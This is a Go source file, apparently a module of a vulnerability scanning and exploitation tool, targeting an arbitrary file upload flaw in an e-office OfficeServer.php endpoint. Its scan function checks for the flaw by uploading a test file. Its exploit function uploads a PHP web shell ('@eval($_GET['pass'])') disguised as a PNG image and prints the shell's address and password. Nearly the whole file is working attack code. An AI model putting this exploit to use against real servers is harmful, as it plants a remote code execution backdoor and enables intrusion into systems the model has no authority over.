package vulners

import (
	"bytes"
	"github.com/fatih/color"
	"github.com/imroc/req/v3"
	"io"
	"strings"
)

type Wo05 struct {
}

func (s *Wo05) Scan(targetUrl string) {
	vulnerable, err := Wo05scancore(targetUrl)
	if err != nil {
		color.Red("[x]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[Wo05] 存在OfficeServer 任意文件上传")
	} else {
		color.White("[Wo05] 不存在OfficeServer 任意文件上传")
	}
}

func (*Wo05) Exploit(targetUrl string) {
	runResult, err := Wo05runcore(targetUrl)
	if err != nil {
		color.Red("[x]漏洞利用异常！")
		return
	}
	if runResult != "" {
		color.Green(runResult)
	} else {
		color.White("[!]漏洞利用无返回结果")
	}
}

func Wo05scancore(targetUrl string) (bool, error) {
	url := "/eoffice10/server/public/iWebOffice2015/OfficeServer.php"
	url1 := "/eoffice10/server/public/iWebOffice2015/Document/test136.txt"
	data := []byte("helloword")
	_, err := baseClient.NewRequest().SetFileUpload(req.FileUpload{
		ParamName: "FileData",
		FileName:  "123.png",
		GetFileContent: func() (io.ReadCloser, error) {
			return io.NopCloser(bytes.NewBuffer(data)), nil
		},
		FileSize:    int64(len(data)),
		ContentType: "image/jpeg",
	}).AddQueryParam("FormData", "{'USERNAME':'','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'test136.txt'}").Post(targetUrl + url)
	if err != nil {
		return false, err
	}
	resp, err := baseClient.NewRequest().
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		Get(targetUrl + url1)
	resContent := resp.String()
	if strings.Contains(resContent, "helloword") {
		return true, nil
	} else {
		return false, nil
	}
}

func Wo05runcore(targetUrl string) (string, error) {
	url := "/eoffice10/server/public/iWebOffice2015/OfficeServer.php"
	url1 := "/eoffice10/server/public/iWebOffice2015/Document/test136.php"
	data := []byte("test<?php @eval($_GET['pass']);?>")
	_, err := baseClient.NewRequest().SetFileUpload(req.FileUpload{
		ParamName: "FileData",
		FileName:  "123.png",
		GetFileContent: func() (io.ReadCloser, error) {
			return io.NopCloser(bytes.NewBuffer(data)), nil
		},
		FileSize:    int64(len(data)),
		ContentType: "image/jpeg",
	}).AddQueryParam("FormData", "{'USERNAME':'','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'test136.php'}").Post(targetUrl + url)
	if err != nil {
		return "", err
	}
	resp, err := baseClient.NewRequest().
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		Get(targetUrl + url1)
	resContent := resp.String()
	if strings.Contains(resContent, "test") {
		return "存在OfficeServer 任意文件上传,密码pass webshell地址:\n" + targetUrl + url1, nil
	} else {
		return "", nil
	}
}
